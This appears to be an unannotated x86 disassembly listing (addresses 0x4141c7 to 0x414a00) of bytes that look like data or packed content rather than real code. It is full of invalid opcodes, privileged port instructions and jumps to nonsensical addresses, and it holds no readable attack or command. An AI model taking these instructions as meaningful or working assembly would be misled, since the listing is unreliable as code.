  4141c7:	sbb    BYTE PTR [ecx-0x3aee0d4c],cl
  4141cd:	mov    esp,ebp
  4141cf:	(bad)  
  4141d0:	cli    
  4141d1:	inc    edx
  4141d2:	cs or  al,0x2a
  4141d5:	arpl   WORD PTR [ebp-0x4906578c],ax
  4141db:	ss pop esp
  4141dd:	ffree  st(1)
  4141df:	sahf   
  4141e0:	add    dh,BYTE PTR [ebp-0x49]
  4141e3:	call   0x8931:0x1ebfedf3
  4141ea:	push   edx
  4141eb:	fs inc edi
  4141ed:	loope  0x414240
  4141ef:	(bad)  
  4141f0:	cmp    esp,esi
  4141f2:	mov    dh,0x6
  4141f4:	cmp    DWORD PTR [ecx+0xf01211],0x0
  4141fe:	in     eax,dx
  4141ff:	inc    edx
  414200:	mov    ebx,0x8b2db9f8
  414205:	sub    DWORD PTR [ebp+0x2],0x5b
  414209:	push   ebp
  41420a:	movhps QWORD PTR [esi+esi*2+0x71],xmm5
  41420f:	mov    eax,0xaa2dbcd6
  414214:	pop    esi
  414215:	dec    esp
  414216:	mov    dh,BYTE PTR [esi-0x74b6cf3a]
  41421c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41421d:	push   ebx
  41421e:	out    dx,al
  41421f:	cmp    al,0xc3
  414221:	push   ebx
  414222:	pop    ebp
  414223:	inc    edi
  414224:	push   0xffffffbc
  414226:	push   0x9c0fab82
  41422b:	mov    ebp,0xc275f11d
  414230:	aaa    
  414231:	mov    ebp,0x3e5ca6c6
  414236:	push   ecx
  414237:	sub    ecx,ebp
  414239:	pop    ebx
  41423a:	dec    ebp
  41423b:	mov    ah,0xfb
  41423d:	add    dh,BYTE PTR [ebp-0x77]
  414240:	add    BYTE PTR [ebx*8+0x3a7502ed],ch
  414247:	inc    esp
  414248:	add    ah,bl
  41424a:	jo     0x414203
  41424c:	jae    0x41429b
  41424e:	into   
  41424f:	ds ins DWORD PTR es:[edi],dx
  414251:	push   esi
  414252:	rol    DWORD PTR [ebx-0x5489c29d],1
  414258:	pop    es
  414259:	push   0xffffffb3
  41425b:	mov    edx,0xc6c28a20
  414260:	inc    ecx
  414261:	jmp    0x414266
  414266:	add    dh,dh
  414268:	cmp    ebp,esi
  41426a:	mov    cs:0x7ea2800e,eax
  414270:	mov    ch,0x74
  414272:	out    0xf5,eax
  414274:	cmp    ebp,DWORD PTR [eax]
  414276:	jmp    0xa5374704
  41427b:	push   cs
  41427c:	jecxz  0x4142f1
  41427e:	cmc    
  41427f:	or     eax,0x17c7ffd
  414284:	mov    dh,0x74
  414286:	in     eax,dx
  414287:	cmc    
  414288:	dec    ecx
  414289:	clc    
  41428a:	loope  0x41426c
  41428c:	inc    ecx
  41428d:	clc    
  41428e:	icebp  
  41428f:	outs   dx,DWORD PTR ds:[esi]
  414290:	jle    0x414263
  414292:	call   0x2aca450d
  414297:	mov    eax,ds:0x76e243bf
  41429c:	add    eax,0x15286b3c
  4142a2:	ins    BYTE PTR es:[edi],dx
  4142a3:	cmp    al,0x6e
  4142a5:	pop    eax
  4142a6:	sar    DWORD PTR ds:0xfbe8ff44,0xbe
  4142ad:	push   eax
  4142ae:	adc    esi,DWORD PTR [esi-0x55]
  4142b1:	pop    ecx
  4142b2:	xchg   edi,eax
  4142b3:	mov    ah,0xba
  4142b5:	adc    BYTE PTR ds:0xc571b652,bl
  4142bb:	push   ds
  4142bc:	jns    0x414338
  4142be:	add    bl,bh
  4142c0:	js     0x414249
  4142c2:	(bad)
  4142c6:	test   DWORD PTR [edx+0x978409],esi
  4142cc:	add    BYTE PTR [eax],al
  4142ce:	add    BYTE PTR [eax],al
  4142d0:	sbb    eax,0x4c330001
  4142d5:	mov    bh,0x40
  4142d7:	sub    BYTE PTR [edx+0x3f],al
  4142da:	mov    DWORD PTR [esp+ebp*2],edx
  4142dd:	test   BYTE PTR [edx],cl
  4142df:	and    BYTE PTR [ebp+0x520572a0],0xfc
  4142e6:	or     ebx,ebp
  4142e8:	add    al,0x81
  4142ea:	cmc    
  4142eb:	sub    esi,DWORD PTR [ecx]
  4142ed:	cld    
  4142ee:	lds    eax,FWORD PTR [edx]
  4142f0:	jl     0x414330
  4142f2:	aaa    
  4142f3:	inc    ebx
  4142f4:	(bad)  
  4142f5:	out    dx,al
  4142f6:	fsubp  st(3),st
  4142f8:	scas   eax,DWORD PTR es:[edi]
  4142f9:	jnp    0x414372
  4142fb:	and    ah,bl
  4142fd:	pop    es
  4142fe:	and    DWORD PTR [edi-0x23],0xd46a0000
  414305:	mov    DWORD PTR [ecx-0x58],edi
  414308:	adc    al,0x69
  41430a:	imul   ecx,DWORD PTR [esi-0x63],0x0
  41430e:	xchg   edi,eax
  414310:	or     al,0xe7
  414312:	add    al,0x58
  414314:	(bad)  
  414315:	out    0x79,al
  414317:	(bad)  
  414318:	mov    ebx,0x1ff04185
  41431d:	cli    
  41431e:	out    dx,eax
  41431f:	add    BYTE PTR [ebx-0x73febbcc],ch
  414325:	add    BYTE PTR [edi+0x65],bh
  414328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414329:	add    BYTE PTR [esi+0x3d40ec],bh
  41432f:	push   esi
  414330:	sbb    edx,DWORD PTR [ebx]
  414332:	adc    al,0x13
  414334:	add    BYTE PTR [eax],al
  414336:	add    BYTE PTR [eax],al
  414338:	add    BYTE PTR [esi+edi*8-0x6bfb5e9b],cl
  41433f:	aas    
  414340:	add    BYTE PTR [ebp+0x3],dh
  414343:	jg     0x414305
  414345:	shr    edx,0x8c
  414348:	or     edx,DWORD PTR [ebp-0x7a]
  41434b:	inc    esi
  41434c:	add    al,dh
  41434e:	jb     0x41437d
  414350:	xor    eax,0x4fc0f482
  414355:	sbb    eax,0x22fd3c38
  41435a:	daa    
  41435b:	shl    DWORD PTR [edi+ecx*2-0x5c],0x72
  414360:	adc    ebx,DWORD PTR ds:0x46004646
  414366:	loop   0x4142f3
  414368:	inc    ebx
  414369:	or     eax,0x5f74d327
  41436e:	mov    ebx,0x93d3c86
  414373:	xor    eax,0x5e095f05
  414378:	data16 in al,dx
  41437a:	mov    ch,0x49
  41437c:	or     eax,0xe4a9af22
  414381:	ss test eax,0x97bf3944
  414387:	lahf   
  414388:	push   esi
  414389:	ret    0x19d6
  41438c:	adc    DWORD PTR ds:0x7d71baa9,esi
  414392:	and    BYTE PTR [esi+0xc],al
  414395:	pop    ds
  414396:	test   eax,0x9c1d05a9
  41439b:	mov    bh,0x89
  41439d:	add    BYTE PTR [eax],al
  41439f:	add    BYTE PTR [eax],al
  4143a1:	add    BYTE PTR [ebp-0x6f248e2],bl
  4143a7:	xchg   ebp,eax
  4143a8:	add    al,0x0
  4143aa:	jne    0x4143eb
  4143ac:	clc    
  4143ad:	pop    ebp
  4143ae:	sub    ebp,DWORD PTR [esi]
  4143b0:	jge    0x414392
  4143b2:	jnp    0x414428
  4143b4:	mov    bh,0x6a
  4143b6:	jne    0x4143d1
  4143b8:	mov    bh,0x13
  4143ba:	mov    ch,0xcb
  4143bc:	inc    ecx
  4143bd:	add    dh,dh
  4143bf:	add    DWORD PTR [ebx-0x788311f8],ebp
  4143c5:	mov    edx,0x2e37b350
  4143ca:	jne    0x41437f
  4143cc:	sbb    cl,BYTE PTR [eax]
  4143ce:	cli    
  4143cf:	ins    BYTE PTR es:[edi],dx
  4143d0:	xchg   DWORD PTR [edx+0x357eb338],edi
  4143d6:	jge    0x41438b
  4143d8:	fcomp  QWORD PTR [edi-0x7a]
  4143db:	inc    edx
  4143dc:	out    0x84,eax
  4143de:	sbb    eax,0x8f3bdc01
  4143e3:	or     al,0x6c
  4143e5:	outs   dx,DWORD PTR ds:[esi]
  4143e6:	shl    DWORD PTR [ebp-0x555246aa],0x1e
  4143ed:	inc    edi
  4143ee:	add    dh,BYTE PTR [ebx+0x6cee1ad1]
  4143f4:	fstp   TBYTE PTR [eax-0x54704d10]
  4143fa:	sub    al,BYTE PTR [ebp-0x18]
  4143fd:	add    esi,esp
  4143ff:	xor    al,0x13
  414401:	add    al,0xec
  414403:	dec    esp
  414404:	jge    0x41440a
  41440a:	add    BYTE PTR [edx+edx*1],bh
  41440d:	dec    edi
  41440e:	pusha  
  41440f:	inc    esp
  414410:	inc    edx
  414411:	out    0x8c,eax
  414413:	lds    eax,FWORD PTR [edx]
  414415:	lods   al,BYTE PTR ds:[esi]
  414416:	cs leave 
  414418:	jl     0x414433
  41441a:	or     DWORD PTR [ecx],edi
  41441c:	shr    BYTE PTR [ebx+ecx*8+0x26],cl
  414420:	std    
  414421:	das    
  414422:	hlt    
  414423:	daa    
  414424:	inc    edx
  414425:	out    0xb1,eax
  414427:	ss mov edx,0x857b2fe8
  41442d:	ins    BYTE PTR es:[edi],dx
  41442e:	pop    ss
  41442f:	mov    BYTE PTR [edx-0x4df94732],dh
  414435:	sbb    eax,0x16522a56
  41443a:	xchg   esi,esi
  41443c:	add    BYTE PTR ds:[ebp+ebp*1+0x36fa50b0],dh
  414444:	test   BYTE PTR [ebx-0x24fe36b],bh
  41444a:	in     eax,0xa0
  41444c:	add    cl,BYTE PTR ds:0x8158367d
  414452:	test   eax,0x28e85271
  414457:	inc    eax
  414458:	mov    cl,0xfd
  41445a:	push   0xfffffff2
  41445c:	fiadd  DWORD PTR [edi-0x17a887d4]
  414462:	pop    ds
  414463:	pop    edx
  414464:	scas   eax,DWORD PTR es:[edi]
  414465:	std    
  414466:	dec    bx
  414468:	call   0x56fd:0xaf5ba7e8
  41446f:	add    BYTE PTR [eax],al
  414471:	add    BYTE PTR [eax],al
  414473:	add    BYTE PTR [ebx-0x4e],bl
  414476:	call   0xfdf09e8a
  41447b:	imul   eax,DWORD PTR [ebx-0x5],0x82f2b3ff
  414482:	arpl   WORD PTR [ecx],si
  414484:	and    eax,0xe3d73b0
  414489:	fild   QWORD PTR [edx+0x26]
  41448c:	sbb    eax,0x772143b9
  414491:	xor    eax,0x671eba2f
  414496:	repnz push cs
  414498:	std    
  414499:	xchg   al,al
  41449b:	jge    0x414457
  41449d:	or     BYTE PTR [ebx+0x1],0x78
  4144a1:	mov    eax,0x3687f143
  4144a6:	sbb    ebp,DWORD PTR [edx+0x61]
  4144a9:	out    dx,al
  4144aa:	(bad)  
  4144ab:	pop    ebx
  4144ac:	push   0xf621417b
  4144b1:	sub    al,BYTE PTR [ecx+ebp*8]
  4144b4:	inc    ebp
  4144b5:	add    BYTE PTR [ecx-0x3f],dl
  4144b8:	imul   esi,DWORD PTR [edi-0x7d4cff03],0xffffffc0
  4144bf:	je     0x414519
  4144c1:	test   BYTE PTR [ecx-0x8],cl
  4144c4:	pop    eax
  4144c5:	js     0x414538
  4144c7:	clc    
  4144c8:	xlat   BYTE PTR ds:[ebx]
  4144c9:	jne    0x4144b3
  4144cb:	aad    0x85
  4144cd:	jns    0x4144ca
  4144cf:	mov    ebx,DWORD PTR [ecx-0x78a1a492]
  4144d5:	mov    edi,0x4c2
  4144da:	add    BYTE PTR [eax],al
  4144dc:	add    BYTE PTR [edx+edx*2-0x79],cl
  4144e0:	in     al,dx
  4144e1:	mov    DWORD PTR [ebx+0x18],0x4f120083
  4144e8:	push   esi
  4144e9:	xchg   edi,eax
  4144ea:	mov    dh,0x88
  4144ec:	inc    ebp
  4144ed:	xor    BYTE PTR [eax+eax*1+0x57],bh
  4144f1:	mov    eax,ds:0xa5ff05ea
  4144f6:	sar    dh,1
  4144f8:	call   FWORD PTR [eax*4-0x7ddcdac2]
  4144ff:	sbb    al,0x1
  414501:	or     al,0x5
  414503:	mov    dl,BYTE PTR [esi-0x23]
  414506:	test   dl,bh
  414508:	xor    bl,dl
  41450a:	adc    BYTE PTR [eax],0x1
  41450d:	int3   
  41450e:	add    al,0x80
  414510:	cli    
  414511:	aad    0x7
  414513:	add    DWORD PTR [edi],0xffffffdd
  414516:	add    al,0x0
  414518:	mov    edx,DWORD PTR [ecx]
  41451a:	or     eax,0xcb9f0987
  41451f:	mov    DWORD PTR [esi+0x73],eax
  414522:	pop    ebp
  414523:	add    eax,DWORD PTR [eax+0x672a1b4]
  414529:	fistp  QWORD PTR [edi+esi*1]
  41452c:	enter  0x722a,0xf6
  414530:	ret    
  414531:	lea    eax,[edi]
  414533:	and    edi,0x8000049c
  414539:	jne    0x414510
  41453b:	icebp  
  41453c:	jb     0x4145b7
  41453e:	or     al,0xc4
  414540:	jmp    0x414545
  414545:	add    BYTE PTR [eax+0x36],dl
  414548:	inc    eax
  414549:	cld    
  41454a:	lds    esi,FWORD PTR [eax+0x30]
  41454d:	or     ch,bh
  41454f:	push   cs
  414550:	mov    eax,0x15eb8c6
  414555:	call   0x456e20
  41455a:	mul    BYTE PTR [ecx+0x4]
  41455d:	or     eax,0x15bf9
  414562:	jne    0x414538
  414564:	inc    eax
  414565:	adc    BYTE PTR [edx+0x1c],ch
  414568:	jl     0x41456a
  41456a:	jne    0x414505
  41456c:	mov    cl,BYTE PTR [ebx+0x79]
  41456f:	es std 
  414571:	mov    esi,0x788aa1ee
  414576:	jno    0x41458c
  414578:	mov    ebx,0x4eb5c001
  41457d:	dec    edi
  41457e:	sbb    eax,0x2fd258a
  414583:	and    eax,DWORD PTR [eax-0x8]
  414586:	lock dec eax
  414588:	sub    eax,0x5d9f808
  41458d:	test   BYTE PTR [eax],dl
  41458f:	call   0xe8d9:0x244a0001
  414596:	push   eax
  414597:	dec    eax
  414598:	add    DWORD PTR [eax],eax
  41459a:	(bad)  
  41459b:	jbe    0x4145b2
  41459d:	mov    DWORD PTR [edi+0x24],esp
  4145a0:	(bad)  [ecx+0x8a9d38]
  4145a6:	call   0x13f5f30
  4145ab:	add    BYTE PTR [eax],al
  4145ad:	add    BYTE PTR [eax],al
  4145af:	(bad)  
  4145b0:	sbb    WORD PTR [ecx+0x29c92475],cx
  4145b7:	mov    bl,0x4e
  4145b9:	inc    ebp
  4145ba:	setnp  BYTE PTR [edx]
  4145bd:	adc    dh,BYTE PTR [edx+edi*8+0x68bd33d]
  4145c4:	mov    dl,0x62
  4145c6:	das    
  4145c7:	pop    ebp
  4145c8:	jge    0x4145e8
  4145ca:	add    ecx,DWORD PTR [ebp+0x70b551e9]
  4145d0:	xchg   BYTE PTR [edi-0x528421d0],ah
  4145d6:	mov    DWORD PTR [ebp-0xb4bcbfd],esp
  4145dc:	stos   BYTE PTR es:[edi],al
  4145dd:	jmp    0x14f0ad12
  4145e2:	mov    al,0xfe
  4145e4:	inc    edi
  4145e5:	jmp    0xda47343d
  4145ea:	push   ebx
  4145eb:	dec    ebp
  4145ec:	pop    ss
  4145ed:	adc    esi,DWORD PTR [ebp+0x2dd89b30]
  4145f3:	js     0x414670
  4145f5:	and    al,0xb0
  4145f7:	out    dx,al
  4145f8:	inc    edi
  4145f9:	jmp    0x1a573451
  4145fe:	lods   al,BYTE PTR ds:[esi]
  4145ff:	ins    BYTE PTR es:[edi],dx
  414600:	push   ds
  414601:	pop    esi
  414602:	mov    ch,0xa4
  414604:	scas   eax,DWORD PTR es:[edi]
  414605:	fdivr  QWORD PTR [ebx-0x80b5055]
  41460b:	pusha  
  41460c:	inc    edx
  41460d:	out    0x80,eax
  41460f:	mov    ecx,0x2f3dfd
  414614:	add    BYTE PTR [eax],al
  414616:	add    BYTE PTR [eax],al
  414618:	in     eax,dx
  414619:	cdq    
  41461a:	jns    0x414645
  41461c:	loopne 0x4145cc
  41461e:	bound  edi,QWORD PTR [edi]
  414620:	jns    0x41469b
  414622:	fisttp WORD PTR [eax+0x4720a36]
  414628:	(bad)  
  414629:	xor    eax,0x2deeb4f5
  41462e:	iret   
  41462f:	mov    ah,0x33
  414631:	jmp    0x414630
  414633:	add    al,0xf7
  414635:	sar    ebp,cl
  414637:	mov    ah,0xa8
  414639:	jno    0x41463b
  41463b:	call   0x209a9689
  414640:	mov    bh,0x9
  414642:	add    BYTE PTR [ebx],bl
  414644:	mov    ecx,0x5bdef398
  414649:	stos   BYTE PTR es:[edi],al
  41464a:	call   0xfdee93ba
  41464f:	ret    0x52c4
  414652:	mov    ebp,edx
  414654:	cmc    
  414655:	sahf   
  414656:	pop    esp
  414657:	jb     0x414604
  414659:	cli    
  41465a:	mov    cl,ch
  41465c:	lds    edx,FWORD PTR [ecx+ecx*4+0x34]
  414660:	ins    DWORD PTR es:[edi],dx
  414661:	jnp    0x414671
  414663:	ds je  0x414620
  414666:	push   0x429bd5
  41466b:	pusha  
  41466c:	mov    ebx,0xa7a129aa
  414671:	sbb    BYTE PTR [ebx],dl
  414673:	and    dh,bl
  414675:	inc    ecx
  414676:	std    
  414677:	jmp    0x76ad965a
  41467c:	add    BYTE PTR [eax],al
  41467e:	add    BYTE PTR [eax],al
  414680:	add    cl,ch
  414682:	jnp    0x41465c
  414684:	fs cmp eax,0x76848400
  41468a:	add    al,BYTE PTR [eax]
  41468c:	jb     0x4146d1
  41468e:	(bad)  
  41468f:	jg     0x414665
  414691:	leave  
  414692:	add    dh,BYTE PTR [ebx+0x11]
  414695:	dec    edi
  414696:	loop   0x414622
  414698:	(bad)  
  414699:	into   
  41469a:	dec    edx
  41469b:	call   0xfdee8478
  4146a0:	mov    fs:0x8c41509a,eax
  4146a6:	dec    edi
  4146a7:	(bad)  
  4146a8:	call   0xffb608ff
  4146ad:	jno    0x414726
  4146af:	inc    ebx
  4146b0:	add    eax,0xb9c57b26
  4146b5:	mov    edx,?
  4146b7:	pop    esp
  4146b8:	add    BYTE PTR [ecx],ch
  4146ba:	fsub   QWORD PTR [edi-0x5089c18]
  4146c0:	call   DWORD PTR [edi]
  4146c2:	fmul   QWORD PTR [ebx]
  4146c4:	mov    esp,DWORD PTR [ebx+ecx*2-0xe647aab]
  4146cb:	add    DWORD PTR [ebx],esi
  4146cd:	stos   DWORD PTR es:[edi],eax
  4146ce:	sub    eax,0x6d77f849
  4146d3:	jg     0x4146be
  4146d5:	adc    DWORD PTR [esi-0x77],0x482514b
  4146dc:	pop    ds
  4146dd:	lea    edx,[esi-0x7b]
  4146e0:	inc    ebp
  4146e1:	and    BYTE PTR [ecx+0x11],dh
  4146e4:	push   eax
  4146e5:	add    BYTE PTR [eax],al
  4146e7:	add    BYTE PTR [eax],al
  4146e9:	add    BYTE PTR [edx+0x41],al
  4146ec:	add    BYTE PTR [ebx-0x72acfde0],al
  4146f2:	xchg   ecx,eax
  4146f3:	dec    esi
  4146f4:	push   eax
  4146f5:	push   ebx
  4146f6:	jmp    0x414702
  4146f8:	cmp    al,0x16
  4146fa:	mov    WORD PTR [esi],es
  4146fc:	xchg   DWORD PTR [ebp+0x24],ecx
  4146ff:	sub    al,0x5
  414701:	lea    edx,[ebx-0x73]
  414704:	std    
  414705:	add    eax,0x4587030f
  41470a:	mov    al,ds:0x240cc485
  41470f:	mov    ch,0x72
  414711:	inc    eax
  414712:	sbb    al,0x2e
  414714:	dec    ecx
  414715:	clc    
  414716:	ja     0x414786
  414718:	dec    ebp
  414719:	push   0x1
  41471b:	cmp    al,0xc6
  41471d:	inc    ebp
  41471e:	cmp    eax,DWORD PTR [edi]
  414720:	call   0xfbb10ee7
  414725:	mov    eax,DWORD PTR [ebx+edi*2-0x27aef029]
  41472c:	cli    
  41472d:	call   FWORD PTR [ebx+0xbff412c]
  414733:	push   ebx
  414734:	push   edi
  414735:	leave  
  414736:	jne    0x414711
  414738:	sti    
  414739:	jmp    DWORD PTR [ecx]
  41473b:	and    BYTE PTR [eax+0x56caa181],ah
  414741:	push   esi
  414742:	inc    edx
  414743:	xor    BYTE PTR [edx+ebp*2+0x5ace207b],dh
  41474a:	in     al,dx
  41474b:	xor    eax,0x89b5
  414750:	add    BYTE PTR [eax],al
  414752:	add    BYTE PTR [edi+ebx*8+0x306a72b5],dh
  414759:	icebp  
  41475a:	cmp    BYTE PTR [edi+0x390b48],al
  414760:	xlat   BYTE PTR ds:[ebx]
  414761:	cmp    dl,BYTE PTR [ebx+ebx*8]
  414764:	xor    BYTE PTR [eax],dh
  414766:	adc    bl,dl
  414768:	sub    DWORD PTR es:[eax+ebp*8],eax
  41476c:	retf   0x72dc
  41476f:	popa   
  414770:	cdq    
  414771:	(bad)  
  414772:	aaa    
  414773:	test   al,0x8d
  414775:	fild   WORD PTR ss:[edi+0x74919c59]
  41477c:	cdq    
  41477d:	add    DWORD PTR [ecx-0x1815bcc],eax
  414783:	pop    esi
  414784:	jg     0x41474d
  414786:	inc    ebx
  414787:	sub    bl,BYTE PTR [edx+0x23254b7c]
  41478d:	xor    ah,dh
  41478f:	mov    eax,ds:0x35815acc
  414794:	pushf  
  414795:	push   ecx
  414796:	call   0xfdf4175b
  41479b:	in     al,dx
  41479c:	pop    esi
  41479d:	test   eax,0x281871e9
  4147a2:	clc    
  4147a3:	jne    0x4147c3
  4147a5:	mov    dl,0x74
  4147a7:	sbb    BYTE PTR ds:[eax],dh
  4147aa:	clc    
  4147ab:	jne    0x41481a
  4147ad:	adc    DWORD PTR [ebx-0x74af0ad0],ecx
  4147b3:	cmp    BYTE PTR [edx],al
  4147b5:	pop    ds
  4147b6:	push   ebx
  4147b7:	add    BYTE PTR [eax],al
  4147b9:	add    BYTE PTR [eax],al
  4147bb:	add    ch,bl
  4147bd:	arpl   WORD PTR ds:0x9477c0b2,bx
  4147c3:	mov    bh,0xf6
  4147c5:	stos   DWORD PTR es:[edi],eax
  4147c6:	xchg   ebx,eax
  4147c7:	hlt    
  4147c8:	cmc    
  4147c9:	sub    eax,0x867802ff
  4147ce:	rol    DWORD PTR [esi*2+0x6d386202],0x7d
  4147d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147d7:	mov    bh,0x25
  4147d9:	jge    0x414807
  4147db:	lods   al,BYTE PTR ds:[esi]
  4147dc:	and    eax,0x80145aab
  4147e1:	xor    eax,0x357859e3
  4147e6:	xlat   BYTE PTR ds:[ebx]
  4147e7:	pushf  
  4147e8:	mov    WORD PTR [ebp-0x3e0e4e3a],gs
  4147ee:	out    dx,al
  4147ef:	xchg   DWORD PTR [ebp+0x1],edi
  4147f2:	out    0x3,eax
  4147f4:	in     al,dx
  4147f5:	sub    al,0xb3
  4147f7:	popf   
  4147f8:	je     0x414871
  4147fa:	sbb    al,0xfc
  4147fc:	sar    BYTE PTR [edi+0x1c],1
  4147ff:	adc    al,0x6d
  414801:	sti    
  414802:	imul   ebp,DWORD PTR [edx+0x75],0x2
  414806:	out    0x1b,eax
  414808:	shl    DWORD PTR ds:0x35280427,0x77
  41480f:	pushf  
  414810:	loope  0x41487f
  414812:	call   0x70eb3c1a
  414817:	aaa    
  414818:	ja     0x414809
  41481a:	xchg   DWORD PTR es:0x9b6efb,esi
  414821:	add    BYTE PTR [eax],al
  414823:	add    BYTE PTR [eax],al
  414825:	jne    0x414829
  414827:	out    0xec,eax
  414829:	mov    bh,0xfe
  41482b:	fld    QWORD PTR [ebp+edx*8-0x3fc18ff]
  414832:	sar    DWORD PTR es:[esi-0x57],cl
  414836:	les    eax,FWORD PTR [eax]
  414838:	add    ah,BYTE PTR [edi+0x79ef0106]
  41483e:	daa    
  41483f:	hlt    
  414840:	div    dl
  414842:	mov    ebp,0x7976e900
  414847:	lds    eax,FWORD PTR [ecx]
  414849:	xchg   edi,eax
  41484a:	and    edi,ebp
  41484c:	push   cs
  41484d:	cs aas 
  41484f:	adc    BYTE PTR [ecx+esi*4-0x4],ch
  414853:	add    DWORD PTR [ebx+0x79],0x2
  414857:	add    dh,dh
  414859:	pushf  
  41485a:	lods   eax,DWORD PTR ds:[esi]
  41485b:	jno    0x414836
  41485d:	lods   eax,DWORD PTR es:[esi]
  41485f:	adc    esp,DWORD PTR ds:0x7200426f
  414865:	ins    BYTE PTR es:[edi],dx
  414866:	add    DWORD PTR [ebx-0x7],eax
  414869:	icebp  
  41486a:	lds    ecx,FWORD PTR [esi+ecx*8]
  41486d:	stos   DWORD PTR es:[edi],eax
  41486e:	scas   al,BYTE PTR es:[edi]
  41486f:	std    
  414870:	cmp    al,0x19
  414872:	push   ebx
  414873:	std    
  414874:	aam    0x52
  414876:	adc    BYTE PTR [eax-0x17],al
  414879:	fld    DWORD PTR [eax+0x4]
  41487c:	bound  edx,QWORD PTR [ecx-0xe4ed6f2]
  414882:	mov    esi,0x3bc0380c
  414887:	adc    dl,ch
  414889:	add    BYTE PTR [eax],al
  41488b:	add    BYTE PTR [eax],al
  41488d:	add    dh,bh
  41488f:	jnp    0x414897
  414891:	bound  ebp,QWORD PTR [ebx+0x12]
  414894:	add    DWORD PTR [edi+0x18f44571],ebp
  41489a:	leave  
  41489b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41489c:	adc    esi,DWORD PTR [ebp+0x6a00427c]
  4148a2:	cmp    dh,bh
  4148a4:	cld    
  4148a5:	fisub  DWORD PTR [esi-0x66]
  4148a8:	inc    ebp
  4148a9:	rol    ch,1
  4148ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ac:	xchg   edx,ebx
  4148ae:	cmp    WORD PTR [ecx-0xb],0x45bc
  4148b4:	std    
  4148b5:	add    ch,bl
  4148b7:	xchg   BYTE PTR [ebx-0x7d],bl
  4148ba:	and    DWORD PTR [esi+0x0],ebx
  4148bd:	jne    0x41492a
  4148bf:	daa    
  4148c0:	push   es
  4148c1:	mov    esp,DWORD PTR [edx]
  4148c3:	add    al,BYTE PTR [edi-0xa3933b5]
  4148c9:	push   edi
  4148ca:	iret   
  4148cb:	ins    DWORD PTR es:[edi],dx
  4148cc:	dec    ebp
  4148cd:	call   0x3c550e
  4148d2:	adc    eax,0x5c85f840
  4148d7:	icebp  
  4148d8:	cmp    dl,BYTE PTR [edi+0x27]
  4148db:	mov    ebp,0x5804de8
  4148e0:	add    BYTE PTR [ecx-0x7788e27],cl
  4148e6:	pop    es
  4148e7:	push   ebx
  4148e8:	sbb    BYTE PTR [ebx+0x14712c8f],cl
  4148ee:	adc    DWORD PTR [edx+0x38],eax
  4148f1:	add    DWORD PTR [eax],eax
  4148f3:	add    BYTE PTR [eax],al
  4148f5:	add    BYTE PTR [eax],al
  4148f7:	xor    al,0x9d
  4148f9:	push   DWORD PTR gs:[ebx]
  4148fc:	jp     0x4148be
  4148fe:	je     0x414941
  414900:	sub    al,0x6
  414902:	add    ecx,DWORD PTR [edi+0x50]
  414905:	sti    
  414906:	jne    0x41490c
  414908:	dec    esi
  414909:	sti    
  41490a:	adc    eax,0x400f50
  41490f:	dec    edi
  414910:	pushf  
  414911:	mov    BYTE PTR [esi],al
  414913:	iret   
  414914:	mov    edx,0x18c60c
  414919:	or     al,BYTE PTR [edi-0x5b]
  41491c:	popf   
  41491d:	cld    
  41491e:	jne    0x414914
  414920:	test   esp,edx
  414922:	push   0x458a59a3
  414927:	mov    ds:0x455b5e39,eax
  41492c:	les    edx,FWORD PTR [eax+eax*1]
  41492f:	leave  
  414930:	sub    ebp,esp
  414932:	xor    DWORD PTR [ebp+0x3f],0xffffffe4
  414936:	push   eax
  414937:	dec    ebx
  414938:	or     al,0xc4
  41493a:	push   ebp
  41493b:	(bad)  
  41493c:	mov    ebp,0x3f3886f9
  414941:	jnp    0x414986
  414943:	int    0xb1
  414945:	inc    esi
  414946:	sbb    al,0x82
  414948:	and    ecx,edx
  41494a:	dec    edx
  41494c:	call   0x1835:0x33d1437c
  414953:	jbe    0x4148db
  414955:	popf   
  414956:	xor    esi,ecx
  414958:	div    DWORD PTR ds:0x8
  41495e:	add    BYTE PTR [eax],al
  414960:	dec    BYTE PTR [eax-0x6f929603]
  414966:	cdq    
  414967:	mov    ch,0x89
  414969:	scas   eax,DWORD PTR es:[edi]
  41496a:	scas   al,BYTE PTR es:[edi]
  41496b:	test   BYTE PTR [ebp+0x749d85c7],dh
  414971:	fwait
  414972:	add    ebp,edi
  414974:	or     esi,DWORD PTR [ebx+0x4569567a]
  41497a:	adc    al,0x55
  41497c:	pop    ebp
  41497d:	jnp    0x41491c
  41497f:	std    
  414980:	push   0x16
  414982:	ror    DWORD PTR ds:0x432f9,0x75
  414989:	and    al,0x43
  41498b:	adc    al,0x94
  41498d:	div    BYTE PTR [ebx+0x7a85a81f]
  414993:	pop    esi
  414994:	xor    cl,BYTE PTR gs:[eax-0x4]
  414998:	not    BYTE PTR [ecx+0x70f70d03]
  41499e:	add    DWORD PTR [eax],eax
  4149a0:	jne    0x4149d6
  4149a2:	add    al,BYTE PTR [ecx-0x7e015fe3]
  4149a8:	add    eax,0x4e00019a
  4149ad:	fisubr WORD PTR [edi+0x6e02f20d]
  4149b3:	add    esi,DWORD PTR [ebp+0x2]
  4149b6:	out    dx,al
  4149b7:	jbe    0x414965
  4149b9:	(bad)  
  4149ba:	pop    esp
  4149bb:	les    ecx,FWORD PTR [ecx-0x357c43d2]
  4149c1:	(bad)  
  4149c2:	cmc    
  4149c3:	jne    0x4149c5
  4149c5:	add    BYTE PTR [eax],al
  4149c7:	add    BYTE PTR [eax],al
  4149c9:	mov    edx,0xb20a20af
  4149ce:	or     DWORD PTR [eax-0x65],0xfffffff4
  4149d2:	rol    DWORD PTR [edi],0xff
  4149d5:	add    DWORD PTR [edx-0x7c2abf90],edi
  4149db:	pop    ds
  4149dc:	std    
  4149dd:	inc    eax
  4149de:	push   esp
  4149df:	push   0xffffffc3
  4149e1:	scas   eax,DWORD PTR es:[edi]
  4149e2:	jmp    0x3c694390
  4149e7:	push   es
  4149e8:	mov    DWORD PTR ss:[ebp-0x56],esi
  4149ec:	add    eax,0x80d72f98
  4149f1:	push   cs
  4149f2:	stos   BYTE PTR es:[edi],al
  4149f3:	xchg   edi,eax
  4149f4:	fwait
  4149f5:	sub    BYTE PTR [ebx-0x19],ch
  4149f8:	add    esi,esp
  4149fa:	stos   BYTE PTR es:[edi],al
  4149fb:	call   0x3cbc8f2f
  414a00:	cld    
